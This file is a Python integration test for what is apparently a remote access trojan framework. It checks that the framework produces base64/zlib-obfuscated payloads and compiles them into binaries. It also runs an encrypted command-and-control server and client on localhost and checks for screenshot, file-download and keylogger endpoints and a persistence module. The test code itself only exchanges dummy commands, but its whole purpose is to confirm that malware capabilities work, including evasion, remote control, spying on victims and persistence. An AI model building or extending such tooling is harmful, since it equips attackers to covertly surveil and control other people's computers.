#!/usr/bin/env python3
"""
Complete Integration Test
Test the entire system end-to-end with all fixes and new features
"""

import os
import sys
import subprocess
import time
import socket
import json
import base64
import threading
from pathlib import Path

sys.path.insert(0, '/workspace')

class CompleteIntegrationTester:
    def __init__(self):
        self.results = {
            'payload_generation': {},
            'obfuscation': {},
            'binary_compilation': {},
            'c2_connection': {},
            'encryption': {},
            'api_endpoints': {},
            'overall': {}
        }
        self.processes = []
        
    def test_payload_generation_with_obfuscation(self):
        """Test generating an obfuscated payload"""
        print("[TEST] Payload Generation with Obfuscation...")
        
        try:
            # Generate a test payload using web generator
            from web_payload_generator import WebPayloadGenerator
            
            gen = WebPayloadGenerator()
            
            config = {
                'platform': 'linux',
                'host': '127.0.0.1',
                'port': '4040',
                'name': 'test_obfuscated',
                'obfuscate': True
            }
            
            result = gen.generate_payload(config)
            
            if result and result.get('success'):
                payload_path = result.get('payload_path')
                
                if payload_path and os.path.exists(payload_path):
                    # Check if obfuscated
                    with open(payload_path, 'r') as f:
                        content = f.read()
                        
                    is_obfuscated = 'base64.b64decode' in content or 'zlib.decompress' in content
                    
                    self.results['payload_generation']['success'] = True
                    self.results['obfuscation']['applied'] = is_obfuscated
                    
                    print(f"  ✓ Payload generated: {payload_path}")
                    print(f"  {'✓' if is_obfuscated else '✗'} Obfuscation applied")
                    
                    return payload_path
                    
        except Exception as e:
            print(f"  ✗ Generation failed: {e}")
            self.results['payload_generation']['error'] = str(e)
            
        return
        
    def test_binary_compilation_of_obfuscated(self):
        """Test compiling an obfuscated payload to binary"""
        print("\n[TEST] Binary Compilation of Obfuscated Payload...")
        
        try:
            # Create simple obfuscated test script
            test_script = '''
import base64
import zlib
exec(zlib.decompress(base64.b64decode('eJxLyczPAAAGAAKh')))
'''
            
            test_path = '/tmp/obf_test.py'
            with open(test_path, 'w') as f:
                f.write(test_script)
                
            # Try to compile with PyInstaller
            from fix_binary_compilation import BinaryCompilationFixer
            
            fixer = BinaryCompilationFixer()
            binary = fixer.compile_with_pyinstaller(test_path, 'obf_binary')
            
            if binary and binary.exists():
                self.results['binary_compilation']['success'] = True
                self.results['binary_compilation']['size'] = binary.stat().st_size
                
                print(f"  ✓ Binary compiled: {binary}")
                print(f"  Size: {binary.stat().st_size:,} bytes")
                
                return binary
            else:
                print("  ✗ Compilation failed")
                self.results['binary_compilation']['success'] = False
                
        except Exception as e:
            print(f"  ✗ Error: {e}")
            self.results['binary_compilation']['error'] = str(e)
            
        return
        
    def test_c2_with_encrypted_communication(self):
        """Test C2 connection with proper encryption"""
        print("\n[TEST] C2 Connection with Encryption...")
        
        try:
            # Start a test C2 server
            server_code = '''
import socket
import struct
import sys
import base64
sys.path.insert(0, '/workspace')

from Configuration.st_encryption import StitchEncryption

# Create server
server = socket.socket()
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(('127.0.0.1', 7777))
server.listen(1)

print("[C2] Server listening on 7777")

# Accept connection
conn, addr = server.accept()
print(f"[C2] Connection from {addr}")

# Create encryptor
enc = StitchEncryption('test_key')

# Send encrypted command
command = "echo test"
encrypted = enc.encrypt(command)

# Send with size header
size = struct.pack('>I', len(encrypted))
conn.send(size + encrypted.encode())

print(f"[C2] Sent encrypted command: {command}")

# Receive response
size_data = conn.recv(4)
if size_data:
    size = struct.unpack('>I', size_data)[0]
    response = conn.recv(size).decode()
    
    # Decrypt response
    decrypted = enc.decrypt(response)
    print(f"[C2] Received response: {decrypted}")

conn.close()
server.close()
'''
            
            with open('/tmp/test_c2_enc.py', 'w') as f:
                f.write(server_code)
                
            # Start server in background
            server_proc = subprocess.Popen(
                ['python3', '/tmp/test_c2_enc.py'],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            self.processes.append(server_proc)
            time.sleep(1)
            
            # Connect with encrypted client
            client_code = '''
import socket
import struct
import sys
import base64
sys.path.insert(0, '/workspace')

from Configuration.st_encryption import StitchEncryption

# Connect to server
sock = socket.socket()
sock.connect(('127.0.0.1', 7777))

print("[Client] Connected")

# Create encryptor with same key
enc = StitchEncryption('test_key')

# Receive encrypted command
size_data = sock.recv(4)
if size_data:
    size = struct.unpack('>I', size_data)[0]
    encrypted_cmd = sock.recv(size).decode()
    
    # Decrypt command
    command = enc.decrypt(encrypted_cmd)
    print(f"[Client] Received command: {command}")
    
    # Execute and encrypt response
    response = "test output"
    encrypted_resp = enc.encrypt(response)
    
    # Send back
    size = struct.pack('>I', len(encrypted_resp))
    sock.send(size + encrypted_resp.encode())
    
    print(f"[Client] Sent encrypted response")

sock.close()
'''
            
            with open('/tmp/test_client_enc.py', 'w') as f:
                f.write(client_code)
                
            # Run client
            client_proc = subprocess.run(
                ['python3', '/tmp/test_client_enc.py'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # Check results
            server_output, _ = server_proc.communicate(timeout=2)
            
            if 'Received response' in server_output:
                self.results['c2_connection']['encrypted'] = True
                self.results['encryption']['working'] = True
                print("  ✓ Encrypted C2 communication successful")
            else:
                print("  ✗ Encrypted communication failed")
                self.results['c2_connection']['encrypted'] = False
                
        except Exception as e:
            print(f"  ✗ Error: {e}")
            self.results['c2_connection']['error'] = str(e)
            
    def test_new_api_endpoints(self):
        """Test the newly added API endpoints"""
        print("\n[TEST] New API Endpoints...")
        
        try:
            # Check if endpoints are defined
            import api_extensions
            
            # Verify functions exist
            functions = [
                'get_system_info',
                'take_screenshot',
                'download_file',
                'manage_keylogger'
            ]
            
            found = []
            for func in functions:
                if hasattr(api_extensions, func) or func in dir(api_extensions):
                    found.append(func)
                    
            self.results['api_endpoints']['defined'] = len(found)
            print(f"  Found {len(found)}/{len(functions)} endpoint functions")
            
            for func in found:
                print(f"    ✓ {func}")
                
            return len(found) >= 3
            
        except Exception as e:
            print(f"  ✗ Error: {e}")
            self.results['api_endpoints']['error'] = str(e)
            return False
            
    def test_persistence_module(self):
        """Test persistence module functionality"""
        print("\n[TEST] Persistence Module...")
        
        try:
            from Configuration import st_persistence
            
            # Check if functions exist
            if hasattr(st_persistence, 'add_persistence'):
                self.results['overall']['persistence'] = True
                print("  ✓ Persistence module has add_persistence function")
                
                # Don't actually add persistence, just verify it's callable
                import inspect
                sig = inspect.signature(st_persistence.add_persistence)
                print(f"  Function signature: {sig}")
                
                return True
            else:
                print("  ✗ Missing add_persistence function")
                
        except Exception as e:
            print(f"  ✗ Error: {e}")
            self.results['overall']['persistence'] = False
            
        return False
        
    def cleanup(self):
        """Clean up test processes"""
        for proc in self.processes:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except Exception:
                    proc.kill()
                    
    def generate_final_report(self):
        """Generate comprehensive test report"""
        print("\n" + "="*70)
        print("COMPLETE INTEGRATION TEST REPORT")
        print("="*70)
        
        # Count successes
        total_tests = 0
        passed = 0
        
        for category, tests in self.results.items():
            if isinstance(tests, dict):
                for test, result in tests.items():
                    if not test.startswith('error'):
                        total_tests += 1
                        if result is True or (isinstance(result, (int, float)) and result > 0):
                            passed += 1
                            
        print(f"\n[TEST SUMMARY]")
        print(f"  Total Tests: {total_tests}")
        print(f"  Passed: {passed}")
        print(f"  Failed: {total_tests - passed}")
        print(f"  Success Rate: {(passed/total_tests*100) if total_tests > 0 else 0:.1f}%")
        
        print("\n[DETAILED RESULTS]")
        for category, tests in self.results.items():
            if tests:
                print(f"\n  {category.upper()}:")
                for test, result in tests.items():
                    if not test.startswith('error'):
                        status = '✓' if (result is True or (isinstance(result, (int, float)) and result > 0)) else '✗'
                        print(f"    {status} {test}: {result}")
                        
        # Save report
        with open('/workspace/complete_integration_report.json', 'w') as f:
            json.dump(self.results, f, indent=2)
            
        print("\n[+] Report saved to complete_integration_report.json")
        
        if passed >= total_tests * 0.8:
            print("\n✅ INTEGRATION SUCCESSFUL - System is working properly!")
        elif passed >= total_tests * 0.6:
            print("\n⚠️  PARTIAL SUCCESS - Most features working")
        else:
            print("\n❌ INTEGRATION ISSUES - Significant problems remain")
            
        return passed >= total_tests * 0.8

def main():
    print("="*70)
    print("COMPLETE INTEGRATION TEST")
    print("="*70)
    print("Testing all components with real execution...\n")
    
    tester = CompleteIntegrationTester()
    
    try:
        # Run all tests
        tester.test_payload_generation_with_obfuscation()
        tester.test_binary_compilation_of_obfuscated()
        tester.test_c2_with_encrypted_communication()
        tester.test_new_api_endpoints()
        tester.test_persistence_module()
        
        # Generate report
        success = tester.generate_final_report()
        
        return success
        
    finally:
        tester.cleanup()

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)